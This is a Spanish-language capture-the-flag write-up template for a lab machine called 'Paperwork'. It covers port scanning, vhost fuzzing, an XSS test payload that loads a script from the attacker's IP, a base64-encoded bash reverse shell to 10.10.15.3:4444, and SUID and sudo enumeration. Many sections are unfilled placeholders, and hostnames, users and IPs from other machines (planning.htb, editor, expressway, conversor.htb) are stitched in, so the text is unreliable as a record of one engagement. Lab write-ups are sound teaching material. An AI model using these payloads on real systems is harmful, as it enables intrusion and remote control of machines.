
# Paperwork

<figure><img src="/files/JFntbU8MqRvPbTnvUqm9" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Paperwork`
* **IP:** `10.129.44.231`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.44.231 paperwork.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.44.231
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.28.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://paperwork.htb` y observamos que parece ser una plataforma interna de archivos corporativos, desde la cual nos podemos descargar un archivo del procesador interno:

<figure><img src="/files/DQbO2MGAaqrQ38dxZs9f" alt=""><figcaption></figcaption></figure>

Al extraer el zip

***

## <mark style="color:$primary;">Enumeración Web</mark>

### WSTG Scan

{% embed url="<https://github.com/afsh4ck/WSTG-Scan>" %}

Este programa automáticamente realiza:

* Enumeración de tecnologías web
* Escaneo de puertos y servicios con Nmap
* Análisis de vulnerabilidades con Nuclei
* Fuzzing de subdominios con ffuf
* Fuzzing de directorios con fuff
* Spidering / Mapeo completo del site
* Detección de formularios y pruebas de inyección
* Pruebas de API (OWASP API Top 10)
* Enumeración de usuarios y bruteforce con hydra

{% code overflow="wrap" %}

```bash
git clone https://github.com/afsh4ck/WSTG-Scan.git
cd WSTG-Scan
python3 wstg-scan.py
```

{% endcode %}

### Hallazgos relevantes

***

## <mark style="color:$primary;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.10.11.68 -H "Host: defnotvalid.planning.htb" | grep "Content-Length:"

Content-Length: 178
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.68/ -H 'Host: FUZZ.planning.htb' -fs 178
```

**Encontramos el subdominio:** `grafana.planning.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de Grafana v11.0.0.

***

## <mark style="color:$primary;">Explotación</mark>

### Prueba de XSS (si hay forms)

Probaremos el siguiente script en los campos del formulario para ver si es vulnerable a Cross Site Scipting (XSS):

```javascript
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>
```

Cambiamos la IP por la nuestra y iniciamos un listener con `Netcat` en el puerto 9000. Hacemos clic en el botón `Send` y comprobamos si el listener recibe una llamada para confirmar la vulnerabilidad.

```shell-session
afsh4ck@kali$ nc -lvnp 9000
```

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con Grafana 11.0.0 en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

**Exploit seleccionado:** *(Describir qué exploit se usó y su URL de referencia)*

### Ejecución del Exploit

Describir paso a paso cómo se logró la ejecución remota o el primer acceso.

### Estabilizar sesión

Usaremos Penelope para estabilizar nuestra sesión y tener persistencia:

{% embed url="<https://github.com/brightio/penelope>" %}

```bash
pipx install git+https://github.com/brightio/penelope

penelope
```

<figure><img src="/files/QFe2CD0y7qzQGRsfXtv4" alt=""><figcaption></figcaption></figure>

Usaremos el payload en bash de la sección `tun0`, ya que estamos conectados por VPN:

```bash
➤  tun0 → 10.10.15.3:4444

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
```

Lo ejecutamos en la máquina objetivo:

```shell-session
nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.15.3] from (UNKNOWN) [10.10.11.92] 50602
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls
conversor.htb
$ printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuMy80NDQ0IDA+JjEpICY=|base64 -d|bash
$ 
```

Y automáticamente recibimos la shell PTY con persistencia:

{% hint style="warning" %}
Con F12 podemos cerrar la sesión para interactuar con ella más tarde
{% endhint %}

<figure><img src="/files/oUGF21qJR5YQYE3Xk3kI" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Acceso Inicial</mark>

Una vez obtenido acceso:

* Verificar usuario actual (`whoami`)
* Verificar entorno (`uname -a`, `id`, `sudo -l`)

***

## <mark style="color:$primary;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
cat /home/<usuario>/user.txt
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario Oliver:

```shell-session
oliver@editor:/tmp$ sudo -l                                                        
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
```

### Versión de SUDO

```shell-session
ike@expressway:~$ sudo -V
Sudo version 1.9.17
```

Esta versión de sudo es vulnerable al CVE-2025-32463, y encontramos varios PoC para explotarlo.

### Enumeración de archivos con permisos especiales

Buscando archivos con permisos especiales, encontré un archivo `ndsudo` sospechoso:

```shell-session
oliver@editor:/tmp$ find / -user root -perm -4000 -print 2>/dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

### Ver servicios internos corriendo

```shell-session
oliver@editor:/tmp$ ss -tuln

Netid State   Recv-Q  Send-Q        Local Address:Port    Peer Address:Port Process 
udp   UNCONN  0       0                 127.0.0.1:8125         0.0.0.0:*            
udp   UNCONN  0       0             127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       128                 0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN  0       4096          127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       511                 0.0.0.0:80           0.0.0.0:*            
tcp   LISTEN  0       151               127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:19999        0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:8125         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:45249        0.0.0.0:*            
tcp   LISTEN  0       70                127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN  0       5                   0.0.0.0:8000         0.0.0.0:*            
tcp   LISTEN  0       128                    [::]:22              [::]:*            
tcp   LISTEN  0       511                    [::]:80              [::]:*            
tcp   LISTEN  0       50       [::ffff:127.0.0.1]:8079               *:*            
tcp   LISTEN  0       50                        *:8080               *:*   
```

Herramientas usadas:

* `sudo -l`
* `find / -perm -4000 2>/dev/null`
* `linpeas.sh`
* `pspy`

#### Técnica aplicada

Describir la técnica usada: binario con SUID, cronjob mal configurado, credenciales duras, etc.

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
cat /root/root.txt
```
